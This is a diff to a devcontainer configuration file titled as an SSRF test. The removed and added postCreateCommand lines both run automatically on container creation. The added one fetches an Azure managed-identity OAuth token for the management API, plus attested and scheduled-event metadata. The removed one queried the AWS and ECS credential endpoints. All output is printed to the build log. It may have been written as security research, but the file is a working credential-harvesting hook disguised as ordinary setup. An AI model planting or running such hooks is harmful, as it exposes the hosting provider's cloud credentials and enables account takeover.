@@ -1,8 +1,8 @@
 {
-  "name": "SSRF Test - Log IMDS Direct",
+  "name": "SSRF Test - Identity Token",
   "image": "mcr.microsoft.com/devcontainers/base:ubuntu",
   "features": {
     "ghcr.io/devcontainers/features/common-utils:2": {}
   },
-  "postCreateCommand": "echo '=== AZURE IMDS ===' && curl -s -H 'Metadata: true' 'http://169.254.169.254/metadata/instance?api-version=2021-02-01' 2>&1 && echo '' && echo '=== AWS IMDS ===' && curl -s http://169.254.169.254/latest/meta-data/ 2>&1 && echo '' && echo '=== ECS CREDS ===' && curl -s http://169.254.170.2/v2/credentials 2>&1 && echo '=== DONE ==='"
+  "postCreateCommand": "echo '=== IDENTITY TOKEN ===' && curl -s -H 'Metadata: true' 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/' 2>&1 && echo '' && echo '=== ATTESTED DATA ===' && curl -s -H 'Metadata: true' 'http://169.254.169.254/metadata/attested/document?api-version=2020-09-01' 2>&1 && echo '=== SCHEDULEDEVENTS ===' && curl -s -H 'Metadata: true' 'http://169.254.169.254/metadata/scheduledevents?api-version=2020-07-01' 2>&1 && echo '=== DONE ==='"
 }
